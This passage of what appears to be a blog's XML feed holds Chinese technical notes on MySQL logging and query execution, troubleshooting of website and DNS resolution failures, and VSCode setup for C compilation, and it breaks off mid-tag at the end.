      <link href="/logging-system-how-an-sql-update-statement-is-executed/"/>
      <url>/logging-system-how-an-sql-update-statement-is-executed/</url>
      
        <content type="html"><![CDATA[<p>本文是基于 <a href="https://time.geekbang.org/column/intro/100020801" target="_blank" rel="noopener">极客时间——MySQL 实战 45 讲</a> 整理的学习笔记，仅供学习参考，请勿用于商业用途，如若侵权，请联系并删除。</p><a id="more"></a><h2 id="课程重点"><a href="#课程重点" class="headerlink" title="课程重点"></a>课程重点</h2><ol><li>了解 redo log（重做日志）和 binlog（归档日志）</li><li>输入一条update语句，在 Mysql 内部中执行了怎样的过程</li></ol><h2 id="重要的日志模块-redo-log"><a href="#重要的日志模块-redo-log" class="headerlink" title="重要的日志模块:redo log"></a>重要的日志模块:redo log</h2><p>当有一条记录需要更新的时候，InnoDB 引擎就会先把记录写到 redo log 里面，并更新内存，这个时候更新就算完成了。</p><p>同时，InnoDB 引擎会在适当的时候， 将这个操作记录更新到磁盘里面，而这个更新往往是在系统比较空闲的时候做。</p><p>与此类似，InnoDB 的 redo log 是固定大小的，比如可以配置为一组 4 个文件，每个文件 的大小是 1GB，那么一共可以记录 4GB 的操作。从头开始写，写到末尾就 又回到开头循环写，如下面这个图所示。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/9tobOn0FD-clipboard.png" alt=""><br>write pos 是当前记录的位置，一边写一边后移，写到第 3 号文件末尾后就回到 0 号文件 开头。checkpoint 是当前要擦除的位置，也是往后推移并且循环的，擦除记录前要把记录更新到数据文件。</p><p>write pos 和 checkpoint 之间的是剩余空着的部分，可以用来记录新的操作。如 果 write pos 追上 checkpoint，表示“粉板”满了，这时候不能再执行新的更新，得停下 来先擦掉一些记录，把 checkpoint 推进一下。</p><p>有了 redo log，InnoDB 就可以保证即使数据库发生异常重启，之前提交的记录都不会丢 失，这个能力称为crash-safe。</p><h2 id="重要的日志模块-binlog"><a href="#重要的日志模块-binlog" class="headerlink" title="重要的日志模块:binlog"></a>重要的日志模块:binlog</h2><p>MySQL 整体来看，其实就有两块:一块是 Server 层，它主要做的是 MySQL 功能层面的事情;还有一块是引擎层，负责存储相关的具体事宜。上面我们聊到 redo log 是 InnoDB 引擎特有的日志，而 Server 层也有自己的日志，称为 binlog(归档日志)。</p><p>redo log 与 binlog 有以下几点区别：</p><ol><li>redo log 是 InnoDB 引擎特有的; binlog 是 MySQL 的 Server 层实现的，所有引擎都 可以使用。</li><li>redo log 是物理日志，记录的是“在某个数据页上做了什么修改”; binlog 是逻辑日志，记录的是这个语句的原始逻辑，比如“给 ID=2 这一行的 c 字段加 1 ”。 </li><li>redo log 是循环写的，空间固定会用完; binlog 是可以追加写入的。“追加写”是指 binlog 文件写到一定大小后会切换到下一个，并不会覆盖以前的日志。</li></ol><p>执行器和 InnoDB 引擎在执行这个简单的 update 语句时的内部流程：</p><ol><li>执行器先找引擎取 ID=2 这一行。ID 是主键，引擎直接用树搜索找到这一行。如果 ID=2 这一行所在的数据页本来就在内存中，就直接返回给执行器;否则，需要先从磁盘 读入内存，然后再返回。</li><li>执行器拿到引擎给的行数据，把这个值加上 1，比如原来是 N，现在就是 N+1，得到新 的一行数据，再调用引擎接口写入这行新数据。</li><li>引擎将这行新数据更新到内存中，同时将这个更新操作记录到 redo log 里面，此时 redo log 处于 prepare 状态。然后告知执行器执行完成了，随时可以提交事务。</li><li>执行器生成这个操作的 binlog，并把 binlog 写入磁盘。</li><li>执行器调用引擎的提交事务接口，引擎把刚刚写入的 redo log 改成提交(commit)状态，更新完成。</li></ol><p>下面这个图是 Update 语句执行流程图，图中浅色框表示在 InnoDb 内部执行的，深色框表示是在执行器中执行的。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/I2NhDXKM0-clipboard.png" alt=""><br>你可能注意到了，最后三步看上去有点“绕”，将 redo log 的写入拆成了两个步骤: prepare 和 commit，这就是”两阶段提交”。</p><h2 id="两阶段提交"><a href="#两阶段提交" class="headerlink" title="两阶段提交"></a>两阶段提交</h2><p>两阶段提交的提交的目的是为了保证 redo log 和 binlog 两个状态在逻辑上一致，要么都成功，要么都不成功。</p><p>由于 redo log 和 binlog 是两个独立的逻辑，如果不用两阶段提交，要么就是先写完 redo log 再写 binlog，或者采用反过来的顺序。我们看看这两种方式会有什么问题。</p><p>仍然用前面的 update 语句来做例子。假设当前 ID=2 的行，字段 c 的值是 0，再假设执行 update 语句过程中在写完第一个日志后，第二个日志还没有写完期间发生了 crash，会出 现什么情况呢?</p><ol><li>先写 redo log 后写 binlog。假设在 redo log 写完，binlog 还没有写完的时候， MySQL 进程异常重启。由于我们前面说过的，redo log 写完之后，系统即使崩溃，仍 然能够把数据恢复回来，所以恢复后这一行 c 的值是 1。<br>但是由于 binlog 没写完就 crash 了，这时候 binlog 里面就没有记录这个语句。因此， 之后备份日志的时候，存起来的 binlog 里面就没有这条语句。 然后你会发现，如果需要用这个 binlog 来恢复临时库的话，由于这个语句的 binlog 丢 失，这个临时库就会少了这一次更新，恢复出来的这一行 c 的值就是 0，与原库的值不 同。</li><li>先写 binlog 后写 redo log。如果在 binlog 写完之后 crash，由于 redo log 还没写， 崩溃恢复以后这个事务无效，所以这一行 c 的值是 0。但是 binlog 里面已经记录了“把 c 从 0 改成 1”这个日志。所以，在之后用 binlog 来恢复的时候就多了一个事务出来， 恢复出来的这一行 c 的值就是 1，与原库的值不同。</li></ol><p>可以看到，如果不使用“两阶段提交”，那么数据库的状态就有可能和用它的日志恢复出来 的库的状态不一致。</p><p>redo log 和 binlog 都可以用于表示事务的提交状态，而两阶段提交就是让这两 个状态保持逻辑上的一致。</p>]]></content>
      
      
      <categories>
          
          <category> Mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>01 Mysql 基础架构：一条 SQL 查询语句是如何执行的</title>
      <link href="/mysql-infrastructure-how-a-sql-query-statement-is-executed/"/>
      <url>/mysql-infrastructure-how-a-sql-query-statement-is-executed/</url>
      
        <content type="html"><![CDATA[<p>本文是基于 <a href="https://time.geekbang.org/column/intro/100020801" target="_blank" rel="noopener">极客时间——MySQL 实战 45 讲</a> 整理的学习笔记，仅供学习参考，请勿用于商业用途，如若侵权，请联系并删除。</p><a id="more"></a><h2 id="课程重点"><a href="#课程重点" class="headerlink" title="课程重点"></a>课程重点</h2><ol><li>了解 Mysql 基础架构是怎样的</li><li>输入一条 select 语句，返回一个结果，在 Mysql 内部中执行了怎样的过程</li><li>连接器、查询缓存、分析器、执行器这些组件的作用分别是什么</li></ol><h2 id="基础架构"><a href="#基础架构" class="headerlink" title="基础架构"></a>基础架构</h2><p>MySQL 的逻辑架构图：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/CbyVKsIDJ-clipboard.png" alt=""><br>大体来说，MySQL 可以分为 Server 层和存储引擎层两部分。</p><p>不同的存储引擎共用一个Server 层，Server 层包括<strong>连接器</strong>、<strong>查询缓存</strong>、<strong>分析器</strong>、<strong>优化器</strong>、<strong>执行器等</strong>，涵盖 MySQL 的大多数核 心服务功能，以及所有的内置函数(如日期、时间、数学和加密函数等)，所有跨存储引擎 的功能都在这一层实现，比如存储过程、触发器、视图等。</p><p>而存储引擎层负责数据的存储和提取。其架构模式是插件式的，支持 <strong>InnoDB</strong>、<strong>MyISAM</strong>、<strong>Memory</strong> 等多个存储引擎。现在最常用的存储引擎是 InnoDB，它从 MySQL 5.5.5 版本开 始成为了默认存储引擎。</p><h2 id="执行过程"><a href="#执行过程" class="headerlink" title="执行过程"></a>执行过程</h2><p>执行一条 select 分为五个步骤：</p><ol><li>客户端发送一条 select 查询给服务器</li><li>服务器先检查查询缓存，如果命中缓存，则立即返回存储在缓存中的结果，否则进入下一阶段</li><li>服务器进行词法分析、语法分析，再由查询优化器生成对应的执行计划</li><li>Mysql 根据执行计划调用存储引擎 API 执行查询</li><li>将结果返回给客户端，同时也会放入查询缓存中</li></ol><h2 id="组件"><a href="#组件" class="headerlink" title="组件"></a>组件</h2><h3 id="连接器"><a href="#连接器" class="headerlink" title="连接器"></a>连接器</h3><p>连接器负责跟客户端建立连接、获取权限、维持和管理连接。</p><p>连接命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -h$ip -P$post -u$user -p</span><br></pre></td></tr></table></figure><p>连接命令中的 mysql 是客户端工具，用来跟服务端建立连接。在完成经典的 TCP 握手后， 连接器就要开始认证你的身份，这个时候用的就是你输入的用户名和密码。</p><ul><li>如果用户名或密码不对，你就会收到一个”Access denied for user”的错误，然后客户端 程序结束执行。</li><li>如果用户名密码认证通过，连接器会到权限表里面查出你拥有的权限。之后，这个连接里 面的权限判断逻辑，都将依赖于此时读到的权限。</li></ul><p>连接完成后，如果你没有后续的动作，这个连接就处于空闲状态，你可以在 show processlist 命令中看到它。</p><p>文本中这个图是 <code>show processlist</code> 的结果，其中的 Command 列显示为“Sleep”的这一行，就表示现在系统里面有一个空闲连接。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/Eo5JRq9fN-clipboard.png" alt=""></p><p>数据库里面，长连接是指连接成功后，如果客户端持续有请求，则一直使用同一个连接。短 连接则是指每次执行完很少的几次查询就断开连接，下次查询再重新建立一个。</p><h3 id="查询缓存"><a href="#查询缓存" class="headerlink" title="查询缓存"></a>查询缓存</h3><p>MySQL 拿到一个查询请求后，会先到查询缓存看看，之前是不是执行过这条语句。之前执 行过的语句及其结果可能会以 key-value 对的形式，被直接缓存在内存中。key 是查询的 语句，value 是查询的结果。如果你的查询能够直接在这个缓存中找到 key，那么这个 value 就会被直接返回给客户端。</p><p>如果语句不在查询缓存中，就会继续后面的执行阶段。执行完成后，执行结果会被存入查询 缓存中。你可以看到，如果查询命中缓存，MySQL 不需要执行后面的复杂操作，就可以直 接返回结果，这个效率会很高。</p><p>但是大多数情况下，不会建议使用查询缓存，这是因为查询缓存往往弊大于利——查询缓存的失效非常频繁，只要有对一个表的更新，这个表上所有的查询缓存都会被清空。</p><h3 id="分析器"><a href="#分析器" class="headerlink" title="分析器"></a>分析器</h3><p>如果没有命中查询缓存，就要开始真正执行语句了。</p><p>分析器先会做“词法分析”。你输入的是由多个字符串和空格组成的一条 SQL 语句，MySQL 需要识别出里面的字符串分别是什么，代表什么。</p><p>“语法分析”则是，根据语法规则，判断你输入的这个 SQL 语句是否满足 MySQL 语法。</p><p>如果你的语句不对，就会收到“You have an error in your SQL syntax“ 的错误提醒。</p><h3 id="优化器"><a href="#优化器" class="headerlink" title="优化器"></a>优化器</h3><p>经过了分析器，MySQL 就知道你要做什么了。在开始执行之前，还要先经过优化器的处理。</p><p>优化器是在表里面有多个索引的时候，决定使用哪个索引;或者在一个语句有多表关联 (join)的时候，决定各个表的连接顺序。</p><p>优化器阶段完成后，这个语句的执行方案就确定下来了，然后进入执行器阶段。</p><h3 id="执行器"><a href="#执行器" class="headerlink" title="执行器"></a>执行器</h3><p>开始执行的时候，要先判断一下你对这个表 T 有没有执行查询的权限，如果没有，就会返 回没有权限的错误，如下所示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from T where ID &#x3D; 10;</span><br><span class="line"></span><br><span class="line">ERROR 1142 (42000): SELECT command denied to user &#39;b&#39;@&#39;localhost&#39; for table &#39;T&#39;</span><br></pre></td></tr></table></figure><p>如果有权限，就打开表继续执行。打开表的时候，执行器就会根据表的引擎定义，去使用这 个引擎提供的接口。</p><p>比如我们这个例子中的表 T 中，ID 字段没有索引，那么执行器的执行流程是这样的：</p><ol><li>调用 InnoDB 引擎接口取这个表的第一行，判断 ID 值是不是 10，如果不是则跳过，如 果是则将这行存在结果集中;</li><li>调用引擎接口取“下一行”，重复相同的判断逻辑，直到取到这个表的最后一行。</li><li>执行器将上述遍历过程中所有满足条件的行组成的记录集作为结果集返回给客户端。</li></ol><p>至此，这个语句就执行完成了。</p><p>对于有索引的表，执行的逻辑也差不多。第一次调用的是“取满足条件的第一行”这个接 口，之后循环取“满足条件的下一行”这个接口，这些接口都是引擎中已经定义好的。</p><p>你会在数据库的慢查询日志中看到一个 rows_examined 的字段，表示这个语句执行过程中 扫描了多少行。这个值就是在执行器每次调用引擎获取数据行的时候累加的。</p>]]></content>
      
      
      <categories>
          
          <category> Mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>为什么域名解析成功，网站仍无法访问</title>
      <link href="/successful-domain-name-analysis-domain-name-lawless-question/"/>
      <url>/successful-domain-name-analysis-domain-name-lawless-question/</url>
      
        <content type="html"><![CDATA[<p>最近总是收到反馈，哪个站点又双叒叕打不开了。我找到对应的站点，按下回车，却又可以正常访问。</p><a id="more"></a><p>这篇文章就来整理一下，为什么同一个网站，有些地方可以访问，有一些地方又无法访问。</p><h2 id="一次完整的请求"><a href="#一次完整的请求" class="headerlink" title="一次完整的请求"></a>一次完整的请求</h2><p>在回答上面的问题之前，我们来看一下完整的网络请求大概需要经历哪些过程。</p><p>成功访问网站包含以下两个阶段，这两个阶段缺一不可，需要同时成功才能正常访问网站，如下图所示：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220514163057.png" alt=""></p><h3 id="阶段一"><a href="#阶段一" class="headerlink" title="阶段一"></a>阶段一</h3><p>DNS根据访问请求中的域名解析出对应的IP地址并返回解析结果。</p><p>在此阶段，出现如下情况将导致网站无法访问：</p><ol><li>域名解析不成功：无法返回解析结果，可参考<a href="https://www.0x2beace.com/what-are-the-reasons-why-the-domain-name-resolution-does-not-take-effect/">域名解析不生效有哪些原因</a>？进行处理。</li><li>域名未进行实名认证：找到对应的服务商进行认证</li></ol><h3 id="阶段二"><a href="#阶段二" class="headerlink" title="阶段二"></a>阶段二</h3><p>访问网站服务器IP获取网站内容。</p><p>在此阶段，出现如下情况，即使DNS成功解析域名的IP地址，网站仍然无法访问：</p><ol><li>网站服务器不可用：服务器不用可的原因就很多了，此处就不详细展开了 </li><li>网站服务器域名及IP地址未备案</li></ol><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>说了这么多，为什么我可以访问？而他们访问不了？</p><p>我能正常访问，他们切换成数据也能正常访问，足以说明网站是正常的。</p><p>他们使用 WIFI 访问不了，很可能就是 DNS 没有正常解析出来对应的IP地址。<br>而解析不成功的原因就有很多了：</p><ul><li>本地网络故障（他们可以访问其他网站，所以可以排除）</li><li>云解析服务器的解析记录异常（我能正常访问，所以也排除）</li><li>域名未通过实名认证（域名能查到备案记录，所以也排除）</li><li>域名解析记录在DNS被修改或者不稳定（通常来说，如果上面都是正常的，那就只有这个原因了）</li></ul><p>这时可以选择手动设置 DNS，从而避免运营商自动获取 DNS 不稳定等问题。</p><p>不同操作系统设置方式不一样，具体步骤可以自行百度。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://support.huaweicloud.com/dns_faq/dns_faq_038.html" target="_blank" rel="noopener">为什么域名解析成功但网站仍然无法访问？</a></li><li><a href="https://support.huaweicloud.com/dns_faq/dns_faq_003.html" target="_blank" rel="noopener">解析不生效有哪些原因？</a></li><li><a href="https://www.dns.com/supports/446.html" target="_blank" rel="noopener">为什么网站有些地区无法访问?</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 一些经验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 一些经验 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>域名解析不生效有哪些原因</title>
      <link href="/what-are-the-reasons-why-the-domain-name-resolution-does-not-take-effect/"/>
      <url>/what-are-the-reasons-why-the-domain-name-resolution-does-not-take-effect/</url>
      
        <content type="html"><![CDATA[<p>域名解析不生效的表现是使用ping命令无法获取正确的域名解析IP地址。</p><a id="more"></a><p>解析不生效的原因包括:</p><ul><li>本地网络故障</li><li>云解析服务器的解析记录异常</li><li>域名解析记录在DNS被修改或者缓存</li><li>域名未通过实名认证</li></ul><p>以域名 example.com 为例，排除解析不生效可采用如下流程：</p><h2 id="1-检查本地网络是否正常"><a href="#1-检查本地网络是否正常" class="headerlink" title="1. 检查本地网络是否正常"></a>1. 检查本地网络是否正常</h2><p>ping其他域名，检查域名解析是否生效?</p><ul><li>若生效，则排除本地网络问题。</li><li>若不生效，则表示本地网络故障，请联系宽带运营商解决网络故障问题。</li></ul><h2 id="2-检查域名解析是否生效"><a href="#2-检查域名解析是否生效" class="headerlink" title="2. 检查域名解析是否生效"></a>2. 检查域名解析是否生效</h2><p>打开终端，执行以下命令：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220514173049.png" alt=""><br>验证NS类型解析：用于指定解析服务商的 DNS 地址。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220514173539.png" alt=""><br>查询指定权威DNS的域名解析是否生效。</p><ul><li>如果命令执行结果显示解析不生效，这时可以登录对应的云解析服务管理控制台，检查解析记录是否异常</li><li>如果命令执行结果显示解析生效，表示域名解析在云解析服务器正常</li></ul><h2 id="3-检查域名解析记录是否被修改或者缓存"><a href="#3-检查域名解析记录是否被修改或者缓存" class="headerlink" title="3. 检查域名解析记录是否被修改或者缓存"></a>3. 检查域名解析记录是否被修改或者缓存</h2><ol><li>检查域名是否修改过DNS服务器<br>修改DNS服务器需要24小时~48小时生效</li><li>检查域名记录是否被本地电脑缓存<ul><li>Windows操作系统:执行ipconfig /flushdns命令刷新DNS缓存</li><li>Linux/Unix操作系统:不会缓存DNS解析记录。 如果安装了nscd缓存服务，执行service nscd restart重启服务刷新缓存。</li></ul></li><li>检查运营商提供的本地 DNS 服务器是否缓存了解析记录<br>域名解析记录的缓存时间通常在一个小时之内，之后重新使用ping命令检查 解析是否效。</li><li>检查本地DNS是否被劫持，解析记录是否被修改<br>执行<code>dig example.com@8.8.8.8</code>或者 <code>dig example.com@114.114.114.114</code>命令，检查公共DNS解析是否生效，建议把本地dns改成公共dns。</li></ol><h2 id="4-检查域名是否完成实名认证"><a href="#4-检查域名是否完成实名认证" class="headerlink" title="4. 检查域名是否完成实名认证"></a>4. 检查域名是否完成实名认证</h2><p>如果域名未进行实名认证，则域名会被注册局会暂停解析，解析不生效。更多阅读为什么域名解析成功但网站仍然无法访问？</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://support.huaweicloud.com/dns_faq/dns_faq_003.html" target="_blank" rel="noopener">解析不生效有哪些原因？</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 一些经验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 一些经验 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记录一次网站无法访问事件</title>
      <link href="/log-a-website-inaccessible-event/"/>
      <url>/log-a-website-inaccessible-event/</url>
      
        <content type="html"><![CDATA[<p>最近经历了一次大面积网站无法访问事件，过程比较魔幻，记录一下。</p><a id="more"></a><p>五月十二日晚上六点半，刚刚上线了一个版本，今天是自己生日，提前预定了一个蛋糕，准备下班了。</p><p>收拾好桌面，左脚都已经离开工位了，突然被同事叫住，被告知网站怎么打不开了，我想都没想就说，你确定吗？我刚刚都还打开过。</p><p>他表情凝重的告诉我，是真的。</p><p>于是我熟练地打开相关客户端，只见满屏的“网络异常”，此时我才意识到可能是真的出大问题了。</p><p>因为两分钟前，我刚上线了一个版本，所以第一时间我以为是是不是我误操作了什么造成的，一下子就慌了。</p><p>WebService、站点、DB依次过了一遍相关的日志，没有发现任何异常，此刻我更不安了，因为找不到问题的问题，往往是最难解决的。</p><p>同一个服务器下面的其他站点都是正常的，慌乱之中，有想过是否是域名过期了，排查之后发现域名并没有过期。</p><p>在经过长达半个小时的排查之后，发现竟然是网站没有备案，导致整个站点被停了…</p><p>有些事情往往就是这么巧。</p><p>为了避免以后再次遇到类似的问题，整理一下网站无法访问的常见排查思路。</p><h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>网站的访问与域名的状态、域名实名认证状态、网站备案状态、解析是否生效、网站网络环境等多个环节有关系。在这些环节中，任意一个环节出现问题，都会导致网站无法访问。</p><h2 id="排查思路"><a href="#排查思路" class="headerlink" title="排查思路"></a>排查思路</h2><ul><li>查询域名注册信息：检查域名是否过期、状态是否正常</li><li>查看域名解析是否生效：检查域名解析是否生效</li><li>查看域名解析配置：检查域名解析配置是否正确</li><li>查看域名备案状态：对于部署在中国大陆区域的网站，检查是否通过备案审核</li><li>查看网站配置：检查网站本地网络环境、网站服务器配置是否正常</li><li>提交工单</li></ul><h2 id="查询域名注册信息"><a href="#查询域名注册信息" class="headerlink" title="查询域名注册信息"></a>查询域名注册信息</h2><p>通常通过 whois 平台，可以查询域名的注册商、注册周期、状态、DNS服务器等注册信息。</p><p>通过这些信息可以快速判断，网站无法访问是否与域名有关。</p><p>常用 whois 查询平台：</p><ul><li><a href="https://whois.chinaz.com" target="_blank" rel="noopener">whois查询——站长之家</a></li><li><a href="https://whois.aliyun.com" target="_blank" rel="noopener">whois查询——中国万网</a></li><li><a href="https://www.huaweicloud.com/whois/index.html" target="_blank" rel="noopener">whois查询——华为云</a></li><li><a href="https://www.alibabacloud.com/zh/whois" target="_blank" rel="noopener">whois查询——阿里云</a></li></ul><h2 id="查看域名解析是否生效"><a href="#查看域名解析是否生效" class="headerlink" title="查看域名解析是否生效"></a>查看域名解析是否生效</h2><p>通过域名成功访问网站的其中一个条件是，域名到IP地址的解析生效。因此，检查域名解析是否成功，是必不可少的一步。</p><p>使用查询命令检测是否生效</p><ul><li>ping</li><li>nslookup</li></ul><h2 id="查看域名解析配置"><a href="#查看域名解析配置" class="headerlink" title="查看域名解析配置"></a>查看域名解析配置</h2><p>解析记录配置错误会导致无法将域名解析到正确的IP地址，从而导致网站无法访问。</p><p>这一步往往需要登录到对应的服务器的控制台进行查看，此处就跳过了。</p><h2 id="查看域名备案状态"><a href="#查看域名备案状态" class="headerlink" title="查看域名备案状态"></a>查看域名备案状态</h2><p>对于服务器部署在中国大陆区域的网站，如果未进行备案，或者备案审核未通过，则会导致网站访问网站被阻断。</p><p>常用备案查询平台：</p><ul><li><a href="https://beian.miit.gov.cn/#/Integrated/index" target="_blank" rel="noopener">ICP/IP地址/域名信息备案</a></li><li><a href="https://icp.chinaz.com" target="_blank" rel="noopener">网站备案查询——站长工具</a></li><li><a href="https://www.beianx.cn" target="_blank" rel="noopener">ICP备案查询网</a></li></ul><h2 id="查看网站配置"><a href="#查看网站配置" class="headerlink" title="查看网站配置"></a>查看网站配置</h2><p>若域名状态正常、解析生效、网站备案审核通过，网站仍然无法访问，需要进一步查看网站的本地网络以及网站的服务器配置。</p><p>这一步则是检查是否是因为服务器自身原因而导致不可用，原因较多，这里只列举几个常见的方向：</p><ol><li>被防火墙拦截</li><li>Web Service异常</li><li>本地网络故障</li><li>等</li></ol><h2 id="提交工单"><a href="#提交工单" class="headerlink" title="提交工单"></a>提交工单</h2><p>如果上述检查全部没有问题，网站仍然无法访问，可以尝试联系对应的服务商，通过提交工单寻求帮助。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://support.huaweicloud.com/dns_faq/dns_faq_140401.html" target="_blank" rel="noopener">网站无法访问排查思路</a></li><li><a href="https://support.huaweicloud.com/dns_faq/dns_faq_015.html" target="_blank" rel="noopener">怎样测试域名解析是否生效？</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 一些经验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 一些经验 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C 语言学习笔记</title>
      <link href="/c-language-study-notes/"/>
      <url>/c-language-study-notes/</url>
      
        <content type="html"><![CDATA[<h2 id="为什么要学习-C-语言"><a href="#为什么要学习-C-语言" class="headerlink" title="为什么要学习 C 语言"></a>为什么要学习 C 语言</h2><p>为什么要学习C 语言？<br>C 语言是无可替代的存在，有些事情只能是C 语言来完成，比如写操作系统。</p><p>学习C 语言的目的并不是精通C，而是理解C 语言的编译过程及内存变化的原理，使用C 去练习各种数据结构。<br>这些才是学习C 语言的目的。</p><a id="more"></a><h2 id="快速上手"><a href="#快速上手" class="headerlink" title="快速上手"></a>快速上手</h2><p>工欲善其事必先利其器，编写 C语言程序的工具非常多：</p><ul><li>VSCode</li><li>Sublime Text</li><li>CLion</li><li>Xcode</li><li>Qt Creator</li></ul><p>根据个人喜好进行选择，前期入门建议使用轻量级的 IDE，这里我选择的是 VSCode。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220509214956.png" alt=""><br><code>.vscode</code>：基于当前工作区生成的配置文件目录，其中主要包含以下文件：</p><ul><li><code>tasks.json</code>：编译器构建设置</li><li><code>launch.json</code>：调试器设置</li><li><code>c_cpp_properties.json</code>：编译器路径和IntelliSense设置</li></ul><p>每次创建一个新的项目（Demo），建议创建一个目录，因为每次编译运行<code>.c</code> 文件，都会额外生成一些文件：</p><ul><li><code>main</code>：对应的可执行文件</li><li><code>main.dsYM</code>：Xcode 生成的文件</li></ul><h3 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h3><p>正式开始之前，确保本地环境已经安装了 <code>gcc</code> 或者其他编译器。</p><p>使用 VSCode 运行 C程序非常简单，只需要在对应的 C文件下点击运行或者使用 <code>^F5</code>即可。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220509214932.png" alt=""></p><h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>在正式开始调试之前，需要先安装一个扩展：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220509215050.png" alt=""><br>安装完成之后，将 <code>launch.json</code> 中的 <code>type</code> 配置项改为 <code>lldb</code>，其他部分不用做修改</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"version"</span>: <span class="string">"0.2.0"</span>,</span><br><span class="line">  <span class="attr">"configurations"</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"name"</span>: <span class="string">"gcc - 生成和调试活动文件"</span>,</span><br><span class="line">      <span class="attr">"type"</span>: <span class="string">"lldb"</span>,</span><br><span class="line">      <span class="attr">"request"</span>: <span class="string">"launch"</span>,</span><br><span class="line">      <span class="attr">"program"</span>: <span class="string">"$&#123;fileDirname&#125;/$&#123;fileBasenameNoExtension&#125;"</span>,</span><br><span class="line">      <span class="attr">"args"</span>: [],</span><br><span class="line">      <span class="attr">"stopAtEntry"</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">"cwd"</span>: <span class="string">"$&#123;fileDirname&#125;"</span>,</span><br><span class="line">      <span class="attr">"environment"</span>: [],</span><br><span class="line">      <span class="attr">"externalConsole"</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">"MIMode"</span>: <span class="string">"lldb"</span>,</span><br><span class="line">      <span class="attr">"preLaunchTask"</span>: <span class="string">"C/C++: gcc 生成活动文件"</span></span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个表示选择对应的调试器，刚才安装的 <code>C/C++</code> 就是一个调试器</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220509215109.png" alt=""><br>调试程序非常简单，只需要在对应代码的前面加上断点，然后点击调试即可。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220509215249.png" alt=""></p><h2 id="从源文件到可执行文件"><a href="#从源文件到可执行文件" class="headerlink" title="从源文件到可执行文件"></a>从源文件到可执行文件</h2><p>仅仅只靠编译是没有办法得到可执行文件的，编译器编译仅仅只是得到了本地文件，最终想到得到可执行文件，还需要进行“链接”处理。</p><h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><p>在Windows 下，编译后生成的并不是<code>exe</code>文件，而是扩展名为<code>.obj</code> 的目标文件; 在Unix 下，编译后生成的并不是可执行文件，而是扩展名为<code>.o</code>  的目标文件。</p><p>这些文件无法执行运行，因为编译过只是检查语法（函数、变成声明）是否正确。</p><p>在Mac 下编译<code>main.c</code> 文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc -c main.c</span><br><span class="line"></span><br><span class="line">main.c  main.o</span><br></pre></td></tr></table></figure><h3 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h3><p>找到所要用到的函数所在的目标文件并结合，最终生成一个可执行文件的过程就是链接。执行链接的程序被成为链接器。</p><p>在Mac 下链接 <code>main.c</code> 文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc main.o -o main</span><br><span class="line"></span><br><span class="line">main.c main.o main</span><br></pre></td></tr></table></figure><p>将编译、链接合并成一步：</p><figure class="highlight 